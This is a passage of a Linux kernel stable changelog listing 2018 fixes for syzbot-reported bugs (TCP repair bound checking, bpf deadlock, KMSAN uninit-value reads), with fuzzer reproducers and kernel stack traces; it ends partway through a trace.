Reviewed-by: Jan Kara
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit 7c35c8733243fa478a457fd3a1d3dbb93e046c29
Author: Tetsuo Handa
Date: Wed May 2 07:07:55 2018 +0900
bdi: wake up concurrent wb\_shutdown() callers.
commit 8236b0ae31c837d2b3a2565c5f8d77f637e824cc upstream.
syzbot is reporting hung tasks at wait\_on\_bit(WB\_shutting\_down) in
wb\_shutdown() [1]. This seems to be because commit 5318ce7d46866e1d ("bdi:
Shutdown writeback on all cgwbs in cgwb\_bdi\_destroy()") forgot to call
wake\_up\_bit(WB\_shutting\_down) after clear\_bit(WB\_shutting\_down).
Introduce a helper function clear\_and\_wake\_up\_bit() and use it, in order
to avoid similar errors in future.
[1] https://syzkaller.appspot.com/bug?id=b297474817af98d5796bc544e1bb806fc3da0e5e
Signed-off-by: Tetsuo Handa
Reported-by: syzbot
Fixes: 5318ce7d46866e1d ("bdi: Shutdown writeback on all cgwbs in cgwb\_bdi\_destroy()")
Cc: Tejun Heo
Reviewed-by: Jan Kara
Suggested-by: Linus Torvalds
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit e1007acaa5b7e6d18fdc6443be7fa46837f3a6b1
Author: Eric Dumazet
Date: Sun Apr 29 18:55:20 2018 -0700
tcp: fix TCP\_REPAIR\_QUEUE bound checking
commit bf2acc943a45d2b2e8a9f1a5ddff6b6e43cc69d9 upstream.
syzbot is able to produce a nasty WARN\_ON() in tcp\_verify\_left\_out()
with following C-repro :
socket(PF\_INET, SOCK\_STREAM, IPPROTO\_IP) = 3
setsockopt(3, SOL\_TCP, TCP\_REPAIR, [1], 4) = 0
setsockopt(3, SOL\_TCP, TCP\_REPAIR\_QUEUE, [-1], 4) = 0
bind(3, {sa\_family=AF\_INET, sin\_port=htons(20002), sin\_addr=inet\_addr("0.0.0.0")}, 16) = 0
sendto(3, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"...,
1242, MSG\_FASTOPEN, {sa\_family=AF\_INET, sin\_port=htons(20002), sin\_addr=inet\_addr("127.0.0.1")}, 16) = 1242
setsockopt(3, SOL\_TCP, TCP\_REPAIR\_WINDOW, "\4\0\0@+\205\0\0\377\377\0\0\377\377\377\177\0\0\0\0", 20) = 0
writev(3, [{"\270", 1}], 1) = 1
setsockopt(3, SOL\_TCP, TCP\_REPAIR\_OPTIONS, "\10\0\0\0\0\0\0\0\0\0\0\0|\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 386) = 0
writev(3, [{"\210v\r[\226\320t\231qwQ\204\264l\254\t\1\20\245\214p\350H\223\254;\\\37\345\307p$"..., 3144}], 1) = 3144
The 3rd system call looks odd :
setsockopt(3, SOL\_TCP, TCP\_REPAIR\_QUEUE, [-1], 4) = 0
This patch makes sure bound checking is using an unsigned compare.
Fixes: ee9952831cfd ("tcp: Initial repair mode")
Signed-off-by: Eric Dumazet
Reported-by: syzbot
Cc: Pavel Emelyanov
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit c1de578f80c66cabccf0b6d24d33ec1929044674
Author: Alexander Popov
Date: Thu Apr 19 15:29:22 2018 +0300
i2c: dev: prevent ZERO\_SIZE\_PTR deref in i2cdev\_ioctl\_rdwr()
commit 23a27722b5292ef0b27403c87a109feea8296a5c upstream.
i2cdev\_ioctl\_rdwr() allocates i2c\_msg.buf using memdup\_user(), which
returns ZERO\_SIZE\_PTR if i2c\_msg.len is zero.
Currently i2cdev\_ioctl\_rdwr() always dereferences the buf pointer in case
of I2C\_M\_RD | I2C\_M\_RECV\_LEN transfer. That causes a kernel oops in
case of zero len.
Let's check the len against zero before dereferencing buf pointer.
This issue was triggered by syzkaller.
Signed-off-by: Alexander Popov
Reviewed-by: Uwe Kleine-König
[wsa: use '< 1' instead of '!' for easier readability]
Signed-off-by: Wolfram Sang
Signed-off-by: Greg Kroah-Hartman
commit f289a74702070a54ddda0dae589cf7db80e0a038
Author: Jiri Olsa
Date: Sun Apr 15 11:23:52 2018 +0200
perf: Remove superfluous allocation error check
commit bfb3d7b8b906b66551424d7636182126e1d134c8 upstream.
If the get\_callchain\_buffers fails to allocate the buffer it will
decrease the nr\_callchain\_events right away.
There's no point of checking the allocation error for
nr\_callchain\_events > 1. Removing that check.
Signed-off-by: Jiri Olsa
Tested-by: Arnaldo Carvalho de Melo
Cc: Alexander Shishkin
Cc: Andi Kleen
Cc: H. Peter Anvin
Cc: Namhyung Kim
Cc: Peter Zijlstra
Cc: Thomas Gleixner
Cc: syzkaller-bugs@googlegroups.com
Cc: x86@kernel.org
Link: http://lkml.kernel.org/r/20180415092352.12403-3-jolsa@kernel.org
Signed-off-by: Arnaldo Carvalho de Melo
Signed-off-by: Greg Kroah-Hartman
commit df2d8c39a894d86a50e61e30310e61413fc10f55
Author: Michal Hocko
Date: Tue Apr 10 16:29:52 2018 -0700
memcg: fix per\_node\_info cleanup
commit 4eaf431f6f71bbed40a4c733ffe93a7e8cedf9d9 upstream.
syzbot has triggered a NULL ptr dereference when allocation fault
injection enforces a failure and alloc\_mem\_cgroup\_per\_node\_info
initializes memcg->nodeinfo only half way through.
But \_\_mem\_cgroup\_free still tries to free all per-node data and
dereferences pn->lruvec\_stat\_cpu unconditioanlly even if the specific
per-node data hasn't been initialized.
The bug is quite unlikely to hit because small allocations do not fail
and we would need quite some numa nodes to make struct
mem\_cgroup\_per\_node large enough to cross the costly order.
Link: http://lkml.kernel.org/r/20180406100906.17790-1-mhocko@kernel.org
Reported-by: syzbot+8a5de3cce7cdc70e9ebe@syzkaller.appspotmail.com
Fixes: 00f3ca2c2d66 ("mm: memcontrol: per-lruvec stats infrastructure")
Signed-off-by: Michal Hocko
Reviewed-by: Andrey Ryabinin
Cc: Johannes Weiner
Signed-off-by: Andrew Morton
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit d3c6a0c203b564ad77246d00b697b771e3a542c6
Author: Yonghong Song
Date: Tue Apr 10 09:37:32 2018 -0700
bpf/tracing: fix a deadlock in perf\_event\_detach\_bpf\_prog
commit 3a38bb98d9abdc3856f26b5ed4332803065cd7cf upstream.
syzbot reported a possible deadlock in perf\_event\_detach\_bpf\_prog.
The error details:
======================================================
WARNING: possible circular locking dependency detected
4.16.0-rc7+ #3 Not tainted
------------------------------------------------------
syz-executor7/24531 is trying to acquire lock:
(bpf\_event\_mutex){+.+.}, at: [<000000008a849b07>] perf\_event\_detach\_bpf\_prog+0x92/0x3d0 kernel/trace/bpf\_trace.c:854
but task is already holding lock:
(&mm->mmap\_sem){++++}, at: [<0000000038768f87>] vm\_mmap\_pgoff+0x198/0x280 mm/util.c:353
which lock already depends on the new lock.
the existing dependency chain (in reverse order) is:
-> #1 (&mm->mmap\_sem){++++}:
\_\_might\_fault+0x13a/0x1d0 mm/memory.c:4571
\_copy\_to\_user+0x2c/0xc0 lib/usercopy.c:25
copy\_to\_user include/linux/uaccess.h:155 [inline]
bpf\_prog\_array\_copy\_info+0xf2/0x1c0 kernel/bpf/core.c:1694
perf\_event\_query\_prog\_array+0x1c7/0x2c0 kernel/trace/bpf\_trace.c:891
\_perf\_ioctl kernel/events/core.c:4750 [inline]
perf\_ioctl+0x3e1/0x1480 kernel/events/core.c:4770
vfs\_ioctl fs/ioctl.c:46 [inline]
do\_vfs\_ioctl+0x1b1/0x1520 fs/ioctl.c:686
SYSC\_ioctl fs/ioctl.c:701 [inline]
SyS\_ioctl+0x8f/0xc0 fs/ioctl.c:692
do\_syscall\_64+0x281/0x940 arch/x86/entry/common.c:287
entry\_SYSCALL\_64\_after\_hwframe+0x42/0xb7
-> #0 (bpf\_event\_mutex){+.+.}:
lock\_acquire+0x1d5/0x580 kernel/locking/lockdep.c:3920
\_\_mutex\_lock\_common kernel/locking/mutex.c:756 [inline]
\_\_mutex\_lock+0x16f/0x1a80 kernel/locking/mutex.c:893
mutex\_lock\_nested+0x16/0x20 kernel/locking/mutex.c:908
perf\_event\_detach\_bpf\_prog+0x92/0x3d0 kernel/trace/bpf\_trace.c:854
perf\_event\_free\_bpf\_prog kernel/events/core.c:8147 [inline]
\_free\_event+0xbdb/0x10f0 kernel/events/core.c:4116
put\_event+0x24/0x30 kernel/events/core.c:4204
perf\_mmap\_close+0x60d/0x1010 kernel/events/core.c:5172
remove\_vma+0xb4/0x1b0 mm/mmap.c:172
remove\_vma\_list mm/mmap.c:2490 [inline]
do\_munmap+0x82a/0xdf0 mm/mmap.c:2731
mmap\_region+0x59e/0x15a0 mm/mmap.c:1646
do\_mmap+0x6c0/0xe00 mm/mmap.c:1483
do\_mmap\_pgoff include/linux/mm.h:2223 [inline]
vm\_mmap\_pgoff+0x1de/0x280 mm/util.c:355
SYSC\_mmap\_pgoff mm/mmap.c:1533 [inline]
SyS\_mmap\_pgoff+0x462/0x5f0 mm/mmap.c:1491
SYSC\_mmap arch/x86/kernel/sys\_x86\_64.c:100 [inline]
SyS\_mmap+0x16/0x20 arch/x86/kernel/sys\_x86\_64.c:91
do\_syscall\_64+0x281/0x940 arch/x86/entry/common.c:287
entry\_SYSCALL\_64\_after\_hwframe+0x42/0xb7
other info that might help us debug this:
Possible unsafe locking scenario:
CPU0 CPU1
---- ----
lock(&mm->mmap\_sem);
lock(bpf\_event\_mutex);
lock(&mm->mmap\_sem);
lock(bpf\_event\_mutex);
\*\*\* DEADLOCK \*\*\*
======================================================
The bug is introduced by Commit f371b304f12e ("bpf/tracing: allow
user space to query prog array on the same tp") where copy\_to\_user,
which requires mm->mmap\_sem, is called inside bpf\_event\_mutex lock.
At the same time, during perf\_event file descriptor close,
mm->mmap\_sem is held first and then subsequent
perf\_event\_detach\_bpf\_prog needs bpf\_event\_mutex lock.
Such a senario caused a deadlock.
As suggested by Daniel, moving copy\_to\_user out of the
bpf\_event\_mutex lock should fix the problem.
Fixes: f371b304f12e ("bpf/tracing: allow user space to query prog array on the same tp")
Reported-by: syzbot+dc5ca0e4c9bfafaf2bae@syzkaller.appspotmail.com
Signed-off-by: Yonghong Song
Signed-off-by: Daniel Borkmann
Signed-off-by: Greg Kroah-Hartman
commit 358029eec4637b86a56a82a3f8db7f749caad34d
Author: Eric Dumazet
Date: Mon Apr 9 06:43:27 2018 -0700
inetpeer: fix uninit-value in inet\_getpeer
commit b6a37e5e25414df4b8e9140a5c6f5ee0ec6f3b90 upstream.
syzbot/KMSAN reported that p->dtime was read while it was
not yet initialized in :
delta = (\_\_u32)jiffies - p->dtime;
if (delta < ttl || !refcount\_dec\_if\_one(&p->refcnt))
gc\_stack[i] = NULL;
This is a false positive, because the inetpeer wont be erased
from rb-tree if the refcount\_dec\_if\_one(&p->refcnt) does not
succeed. And this wont happen before first inet\_putpeer() call
for this inetpeer has been done, and ->dtime field is written
exactly before the refcount\_dec\_and\_test(&p->refcnt).
The KMSAN report was :
BUG: KMSAN: uninit-value in inet\_peer\_gc net/ipv4/inetpeer.c:163 [inline]
BUG: KMSAN: uninit-value in inet\_getpeer+0x1567/0x1e70 net/ipv4/inetpeer.c:228
CPU: 0 PID: 9494 Comm: syz-executor5 Not tainted 4.16.0+ #82
Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 01/01/2011
Call Trace:
\_\_dump\_stack lib/dump\_stack.c:17 [inline]
dump\_stack+0x185/0x1d0 lib/dump\_stack.c:53
kmsan\_report+0x142/0x240 mm/kmsan/kmsan.c:1067
\_\_msan\_warning\_32+0x6c/0xb0 mm/kmsan/kmsan\_instr.c:676
inet\_peer\_gc net/ipv4/inetpeer.c:163 [inline]
inet\_getpeer+0x1567/0x1e70 net/ipv4/inetpeer.c:228
inet\_getpeer\_v4 include/net/inetpeer.h:110 [inline]
icmpv4\_xrlim\_allow net/ipv4/icmp.c:330 [inline]
icmp\_send+0x2b44/0x3050 net/ipv4/icmp.c:725
ip\_options\_compile+0x237c/0x29f0 net/ipv4/ip\_options.c:472
ip\_rcv\_options net/ipv4/ip\_input.c:284 [inline]
ip\_rcv\_finish+0xda8/0x16d0 net/ipv4/ip\_input.c:365
NF\_HOOK include/linux/netfilter.h:288 [inline]
ip\_rcv+0x119d/0x16f0 net/ipv4/ip\_input.c:493
\_\_netif\_receive\_skb\_core+0x47cf/0x4a80 net/core/dev.c:4562
\_\_netif\_receive\_skb net/core/dev.c:4627 [inline]
netif\_receive\_skb\_internal+0x49d/0x630 net/core/dev.c:4701
netif\_receive\_skb+0x230/0x240 net/core/dev.c:4725
tun\_rx\_batched drivers/net/tun.c:1555 [inline]
tun\_get\_user+0x6d88/0x7580 drivers/net/tun.c:1962
tun\_chr\_write\_iter+0x1d4/0x330 drivers/net/tun.c:1990
do\_iter\_readv\_writev+0x7bb/0x970 include/linux/fs.h:1776
do\_iter\_write+0x30d/0xd40 fs/read\_write.c:932
vfs\_writev fs/read\_write.c:977 [inline]
do\_writev+0x3c9/0x830 fs/read\_write.c:1012
SYSC\_writev+0x9b/0xb0 fs/read\_write.c:1085
SyS\_writev+0x56/0x80 fs/read\_write.c:1082
do\_syscall\_64+0x309/0x430 arch/x86/entry/common.c:287
entry\_SYSCALL\_64\_after\_hwframe+0x3d/0xa2
RIP: 0033:0x455111
RSP: 002b:00007fae0365cba0 EFLAGS: 00000293 ORIG\_RAX: 0000000000000014
RAX: ffffffffffffffda RBX: 000000000000002e RCX: 0000000000455111
RDX: 0000000000000001 RSI: 00007fae0365cbf0 RDI: 00000000000000fc
RBP: 0000000020000040 R08: 00000000000000fc R09: 0000000000000000
R10: 000000000000002e R11: 0000000000000293 R12: 00000000ffffffff
R13: 0000000000000658 R14: 00000000006fc8e0 R15: 0000000000000000
Uninit was created at:
kmsan\_save\_stack\_with\_flags mm/kmsan/kmsan.c:278 [inline]
kmsan\_internal\_poison\_shadow+0xb8/0x1b0 mm/kmsan/kmsan.c:188
kmsan\_kmalloc+0x94/0x100 mm/kmsan/kmsan.c:314
kmem\_cache\_alloc+0xaab/0xb90 mm/slub.c:2756
inet\_getpeer+0xed8/0x1e70 net/ipv4/inetpeer.c:210
inet\_getpeer\_v4 include/net/inetpeer.h:110 [inline]
ip4\_frag\_init+0x4d1/0x740 net/ipv4/ip\_fragment.c:153
inet\_frag\_alloc net/ipv4/inet\_fragment.c:369 [inline]
inet\_frag\_create net/ipv4/inet\_fragment.c:385 [inline]
inet\_frag\_find+0x7da/0x1610 net/ipv4/inet\_fragment.c:418
ip\_find net/ipv4/ip\_fragment.c:275 [inline]
ip\_defrag+0x448/0x67a0 net/ipv4/ip\_fragment.c:676
ip\_check\_defrag+0x775/0xda0 net/ipv4/ip\_fragment.c:724
packet\_rcv\_fanout+0x2a8/0x8d0 net/packet/af\_packet.c:1447
deliver\_skb net/core/dev.c:1897 [inline]
deliver\_ptype\_list\_skb net/core/dev.c:1912 [inline]
\_\_netif\_receive\_skb\_core+0x314a/0x4a80 net/core/dev.c:4545
\_\_netif\_receive\_skb net/core/dev.c:4627 [inline]
netif\_receive\_skb\_internal+0x49d/0x630 net/core/dev.c:4701
netif\_receive\_skb+0x230/0x240 net/core/dev.c:4725
tun\_rx\_batched drivers/net/tun.c:1555 [inline]
tun\_get\_user+0x6d88/0x7580 drivers/net/tun.c:1962
tun\_chr\_write\_iter+0x1d4/0x330 drivers/net/tun.c:1990
do\_iter\_readv\_writev+0x7bb/0x970 include/linux/fs.h:1776
do\_iter\_write+0x30d/0xd40 fs/read\_write.c:932
vfs\_writev fs/read\_write.c:977 [inline]
do\_writev+0x3c9/0x830 fs/read\_write.c:1012
SYSC\_writev+0x9b/0xb0 fs/read\_write.c:1085
SyS\_writev+0x56/0x80 fs/read\_write.c:1082
do\_syscall\_64+0x309/0x430 arch/x86/entry/common.c:287
entry\_SYSCALL\_64\_after\_hwframe+0x3d/0xa2
Signed-off-by: Eric Dumazet
Reported-by: syzbot
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 6996a998c669b3a81cd02715affe21801defff92
Author: Eric Dumazet
Date: Sat Apr 7 13:42:43 2018 -0700
soreuseport: initialise timewait reuseport field
commit 3099a52918937ab86ec47038ad80d377ba16c531 upstream.
syzbot reported an uninit-value in inet\_csk\_bind\_conflict() [1]
It turns out we never propagated sk->sk\_reuseport into timewait socket.
[1]
BUG: KMSAN: uninit-value in inet\_csk\_bind\_conflict+0x5f9/0x990 net/ipv4/inet\_connection\_sock.c:151
CPU: 1 PID: 3589 Comm: syzkaller008242 Not tainted 4.16.0+ #82
Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 01/01/2011
Call Trace:
\_\_dump\_stack lib/dump\_stack.c:17 [inline]
dump\_stack+0x185/0x1d0 lib/dump\_stack.c:53
kmsan\_report+0x142/0x240 mm/kmsan/kmsan.c:1067
\_\_msan\_warning\_32+0x6c/0xb0 mm/kmsan/kmsan\_instr.c:676
inet\_csk\_bind\_conflict+0x5f9/0x990 net/ipv4/inet\_connection\_sock.c:151
inet\_csk\_get\_port+0x1d28/0x1e40 net/ipv4/inet\_connection\_sock.c:320
inet6\_bind+0x121c/0x1820 net/ipv6/af\_inet6.c:399
SYSC\_bind+0x3f2/0x4b0 net/socket.c:1474
SyS\_bind+0x54/0x80 net/socket.c:1460
do\_syscall\_64+0x309/0x430 arch/x86/entry/common.c:287
entry\_SYSCALL\_64\_after\_hwframe+0x3d/0xa2
RIP: 0033:0x4416e9
RSP: 002b:00007ffce6d15c88 EFLAGS: 00000217 ORIG\_RAX: 0000000000000031
RAX: ffffffffffffffda RBX: 0100000000000000 RCX: 00000000004416e9
RDX: 000000000000001c RSI: 0000000020402000 RDI: 0000000000000004
RBP: 0000000000000000 R08: 00000000e6d15e08 R09: 00000000e6d15e08
R10: 0000000000000004 R11: 0000000000000217 R12: 0000000000009478
R13: 00000000006cd448 R14: 0000000000000000 R15: 0000000000000000
Uninit was stored to memory at:
kmsan\_save\_stack\_with\_flags mm/kmsan/kmsan.c:278 [inline]
kmsan\_save\_stack mm/kmsan/kmsan.c:293 [inline]
kmsan\_internal\_chain\_origin+0x12b/0x210 mm/kmsan/kmsan.c:684
\_\_msan\_chain\_origin+0x69/0xc0 mm/kmsan/kmsan\_instr.c:521
tcp\_time\_wait+0xf17/0xf50 net/ipv4/tcp\_minisocks.c:283
tcp\_rcv\_state\_process+0xebe/0x6490 net/ipv4/tcp\_input.c:6003
tcp\_v6\_do\_rcv+0x11dd/0x1d90 net/ipv6/tcp\_ipv6.c:1331
sk\_backlog\_rcv include/net/sock.h:908 [inline]
\_\_release\_sock+0x2d6/0x680 net/core/sock.c:2271
release\_sock+0x97/0x2a0 net/core/sock.c:2786
tcp\_close+0x277/0x18f0 net/ipv4/tcp.c:2269
inet\_release+0x240/0x2a0 net/ipv4/af\_inet.c:427
inet6\_release+0xaf/0x100 net/ipv6/af\_inet6.c:435
sock\_release net/socket.c:595 [inline]
sock\_close+0xe0/0x300 net/socket.c:1149
\_\_fput+0x49e/0xa10 fs/file\_table.c:209
\_\_\_\_fput+0x37/0x40 fs/file\_table.c:243
task\_work\_run+0x243/0x2c0 kernel/task\_work.c:113
exit\_task\_work include/linux/task\_work.h:22 [inline]
do\_exit+0x10e1/0x38d0 kernel/exit.c:867
do\_group\_exit+0x1a0/0x360 kernel/exit.c:970
SYSC\_exit\_group+0x21/0x30 kernel/exit.c:981
SyS\_exit\_group+0x25/0x30 kernel/exit.c:979
do\_syscall\_64+0x309/0x430 arch/x86/entry/common.c:287
entry\_SYSCALL\_64\_after\_hwframe+0x3d/0xa2
Uninit was stored to memory at:
kmsan\_save\_stack\_with\_flags mm/kmsan/kmsan.c:278 [inline]
kmsan\_save\_stack mm/kmsan/kmsan.c:293 [inline]
kmsan\_internal\_chain\_origin+0x12b/0x210 mm/kmsan/kmsan.c:684
\_\_msan\_chain\_origin+0x69/0xc0 mm/kmsan/kmsan\_instr.c:521
inet\_twsk\_alloc+0xaef/0xc00 net/ipv4/inet\_timewait\_sock.c:182
tcp\_time\_wait+0xd9/0xf50 net/ipv4/tcp\_minisocks.c:258
tcp\_rcv\_state\_process+0xebe/0x6490 net/ipv4/tcp\_input.c:6003
tcp\_v6\_do\_rcv+0x11dd/0x1d90 net/ipv6/tcp\_ipv6.c:1331
sk\_backlog\_rcv include/net/sock.h:908 [inline]
\_\_release\_sock+0x2d6/0x680 net/core/sock.c:2271
release\_sock+0x97/0x2a0 net/core/sock.c:2786
tcp\_close+0x277/0x18f0 net/ipv4/tcp.c:2269
inet\_release+0x240/0x2a0 net/ipv4/af\_inet.c:427
inet6\_release+0xaf/0x100 net/ipv6/af\_inet6.c:435
sock\_release net/socket.c:595 [inline]
sock\_close+0xe0/0x300 net/socket.c:1149
\_\_fput+0x49e/0xa10 fs/file\_table.c:209
\_\_\_\_fput+0x37/0x40 fs/file\_table.c:243
task\_work\_run+0x243/0x2c0 kernel/task\_work.c:113
exit\_task\_work include/linux/task\_work.h:22 [inline]
do\_exit+0x10e1/0x38d0 kernel/exit.c:867
do\_group\_exit+0x1a0/0x360 kernel/exit.c:970
SYSC\_exit\_group+0x21/0x30 kernel/exit.c:981
SyS\_exit\_group+0x25/0x30 kernel/exit.c:979
do\_syscall\_64+0x309/0x430 arch/x86/entry/common.c:287
entry\_SYSCALL\_64\_after\_hwframe+0x3d/0xa2
Uninit was created at:
kmsan\_save\_stack\_with\_flags mm/kmsan/kmsan.c:278 [inline]
kmsan\_internal\_poison\_shadow+0xb8/0x1b0 mm/kmsan/kmsan.c:188
kmsan\_kmalloc+0x94/0x100 mm/kmsan/kmsan.c:314
kmem\_cache\_alloc+0xaab/0xb90 mm/slub.c:2756
inet\_twsk\_alloc+0x13b/0xc00 net/ipv4/inet\_timewait\_sock.c:163
tcp\_time\_wait+0xd9/0xf50 net/ipv4/tcp\_minisocks.c:258
tcp\_rcv\_state\_process+0xebe/0x6490 net/ipv4/tcp\_input.c:6003
tcp\_v6\_do\_rcv+0x11dd/0x1d90 net/ipv6/tcp\_ipv6.c:1331
sk\_backlog\_rcv include/net/sock.h:908 [inline]
\_\_release\_sock+0x2d6/0x680 net/core/sock.c:2271
release\_sock+0x97/0x2a0 net/core/sock.c:2786
tcp\_close+0x277/0x18f0 net/ipv4/tcp.c:2269
inet\_release+0x240/0x2a0 net/ipv4/af\_inet.c:427
inet6\_release+0xaf/0x100 net/ipv6/af\_inet6.c:435
sock\_release net/socket.c:595 [inline]
sock\_close+0xe0/0x300 net/socket.c:1149
\_\_fput+0x49e/0xa10 fs/file\_table.c:209
\_\_\_\_fput+0x37/0x40 fs/file\_table.c:243
task\_work\_run+0x243/0x2c0 kernel/task\_work.c:113
exit\_task\_work include/linux/task\_work.h:22 [inline]
do\_exit+0x10e1/0x38d0 kernel/exit.c:867
do\_group\_exit+0x1a0/0x360 kernel/exit.c:970
SYSC\_exit\_group+0x21/0x30 kernel/exit.c:981
SyS\_exit\_group+0x25/0x30 kernel/exit.c:979
do\_syscall\_64+0x309/0x430 arch/x86/entry/common.c:287
entry\_SYSCALL\_64\_after\_hwframe+0x3d/0xa2
Fixes: da5e36308d9f ("soreuseport: TCP/IPv4 implementation")
Signed-off-by: Eric Dumazet
Reported-by: syzbot
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit be098d28f86d547845b39b547c8603b156fa48b5
Author: Eric Dumazet
Date: Sat Apr 7 13:42:42 2018 -0700
ipv4: fix uninit-value in ip\_route\_output\_key\_hash\_rcu()
commit d0ea2b12500543535be3f54e17920fffc9bb45f6 upstream.
syzbot complained that res.type could be used while not initialized.
Using RTN\_UNSPEC as initial value seems better than using garbage.
BUG: KMSAN: uninit-value in \_\_mkroute\_output net/ipv4/route.c:2200 [inline]
BUG: KMSAN: uninit-value in ip\_route\_output\_key\_hash\_rcu+0x31f0/0x3940 net/ipv4/route.c:2493
CPU: 1 PID: 12207 Comm: syz-executor0 Not tainted 4.16.0+ #81
Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 01/01/2011
Call Trace:
\_\_dump\_stack lib/dump\_stack.c:17 [inline]
dump\_stack+0x185/0x1d0 lib/dump\_stack.c:53
kmsan\_report+0x142/0x240 mm/kmsan/kmsan.c:1067
\_\_msan\_warning\_32+0x6c/0xb0 mm/kmsan/kmsan\_instr.c:676
\_\_mkroute\_output net/ipv4/route.c:2200 [inline]
ip\_route\_output\_key\_hash\_rcu+0x31f0/0x3940 net/ipv4/route.c:2493
ip\_route\_output\_key\_hash net/ipv4/route.c:2322 [inline]
\_\_ip\_route\_output\_key include/net/route.h:126 [inline]
ip\_route\_output\_flow+0x1eb/0x3c0 net/ipv4/route.c:2577
raw\_sendmsg+0x1861/0x3ed0 net/ipv4/raw.c:653
inet\_sendmsg+0x48d/0x740 net/ipv4/af\_inet.c:764
sock\_sendmsg\_nosec net/socket.c:630 [inline]
sock\_sendmsg net/socket.c:640 [inline]
SYSC\_sendto+0x6c3/0x7e0 net/socket.c:1747
SyS\_sendto+0x8a/0xb0 net/socket.c:1715
do\_syscall\_64+0x309/0x430 arch/x86/entry/common.c:287
entry\_SYSCALL\_64\_after\_hwframe+0x3d/0xa2
RIP: 0033:0x455259
RSP: 002b:00007fdc0625dc68 EFLAGS: 00000246 ORIG\_RAX: 000000000000002c
RAX: ffffffffffffffda RBX: 00007fdc0625e6d4 RCX: 0000000000455259
RDX: 0000000000000000 RSI: 0000000020000040 RDI: 0000000000000013
RBP: 000000000072bea0 R08: 0000000020000080 R09: 0000000000000010
R10: 0000000000000000 R11: 0000000000000246 R12: 00000000ffffffff
R13: 00000000000004f7 R14: 00000000006fa7c8 R15: 0000000000000000
Local variable description: ----res.i.i@ip\_route\_output\_flow
Variable was created at:
ip\_route\_output\_flow+0x75/0x3c0 net/ipv4/route.c:2576
raw\_sendmsg+0x1861/0x3ed0 net/ipv4/raw.c:653
Signed-off-by: Eric Dumazet
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 4bb619f4684c37b6eee23c412c31232ca4556b3f
Author: Eric Dumazet
Date: Sat Apr 7 13:42:41 2018 -0700
dccp: initialize ireq->ir\_mark
commit b855ff827476adbdc2259e9895681d82b7b26065 upstream.
syzbot reported an uninit-value read of skb->mark in iptable\_mangle\_hook()
Thanks to the nice report, I tracked the problem to dccp not caring
of ireq->ir\_mark for passive sessions.
BUG: KMSAN: uninit-value in ipt\_mangle\_out net/ipv4/netfilter/iptable\_mangle.c:66 [inline]
BUG: KMSAN: uninit-value in iptable\_mangle\_hook+0x5e5/0x720 net/ipv4/netfilter/iptable\_mangle.c:84
CPU: 0 PID: 5300 Comm: syz-executor3 Not tainted 4.16.0+ #81
Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 01/01/2011
Call Trace:
\_\_dump\_stack lib/dump\_stack.c:17 [inline]
dump\_stack+0x185/0x1d0 lib/dump\_stack.c:53
kmsan\_report+0x142/0x240 mm/kmsan/kmsan.c:1067
\_\_msan\_warning\_32+0x6c/0xb0 mm/kmsan/kmsan\_instr.c:676
ipt\_mangle\_out net/ipv4/netfilter/iptable\_mangle.c:66 [inline]
iptable\_mangle\_hook+0x5e5/0x720 net/ipv4/netfilter/iptable\_mangle.c:84
nf\_hook\_entry\_hookfn include/linux/netfilter.h:120 [inline]
nf\_hook\_slow+0x158/0x3d0 net/netfilter/core.c:483
nf\_hook include/linux/netfilter.h:243 [inline]
\_\_ip\_local\_out net/ipv4/ip\_output.c:113 [inline]
ip\_local\_out net/ipv4/ip\_output.c:122 [inline]
ip\_queue\_xmit+0x1d21/0x21c0 net/ipv4/ip\_output.c:504
dccp\_transmit\_skb+0x15eb/0x1900 net/dccp/output.c:142
dccp\_xmit\_packet+0x814/0x9e0 net/dccp/output.c:281
dccp\_write\_xmit+0x20f/0x480 net/dccp/output.c:363
dccp\_sendmsg+0x12ca/0x12d0 net/dccp/proto.c:818
inet\_sendmsg+0x48d/0x740 net/ipv4/af\_inet.c:764
sock\_sendmsg\_nosec net/socket.c:630 [inline]
sock\_sendmsg net/socket.c:640 [inline]
\_\_\_sys\_sendmsg+0xec0/0x1310 net/socket.c:2046
\_\_sys\_sendmsg net/socket.c:2080 [inline]
SYSC\_sendmsg+0x2a3/0x3d0 net/socket.c:2091
SyS\_sendmsg+0x54/0x80 net/socket.c:2087
do\_syscall\_64+0x309/0x430 arch/x86/entry/common.c:287
entry\_SYSCALL\_64\_after\_hwframe+0x3d/0xa2
RIP: 0033:0x455259
RSP: 002b:00007f1a4473dc68 EFLAGS: 00000246 ORIG\_RAX: 000000000000002e
RAX: ffffffffffffffda RBX: 00007f1a4473e6d4 RCX: 0000000000455259
RDX: 0000000000000000 RSI: 0000000020b76fc8 RDI: 0000000000000015
RBP: 000000000072bea0 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 00000000ffffffff
R13: 00000000000004f0 R14: 00000000006fa720 R15: 0000000000000000
Uninit was stored to memory at:
kmsan\_save\_stack\_with\_flags mm/kmsan/kmsan.c:278 [inline]
kmsan\_save\_stack mm/kmsan/kmsan.c:293 [inline]
kmsan\_internal\_chain\_origin+0x12b/0x210 mm/kmsan/kmsan.c:684
\_\_msan\_chain\_origin+0x69/0xc0 mm/kmsan/kmsan\_instr.c:521
ip\_queue\_xmit+0x1e35/0x21c0 net/ipv4/ip\_output.c:502
dccp\_transmit\_skb+0x15eb/0x1900 net/dccp/output.c:142
dccp\_xmit\_packet+0x814/0x9e0 net/dccp/output.c:281
dccp\_write\_xmit+0x20f/0x480 net/dccp/output.c:363
dccp\_sendmsg+0x12ca/0x12d0 net/dccp/proto.c:818
inet\_sendmsg+0x48d/0x740 net/ipv4/af\_inet.c:764
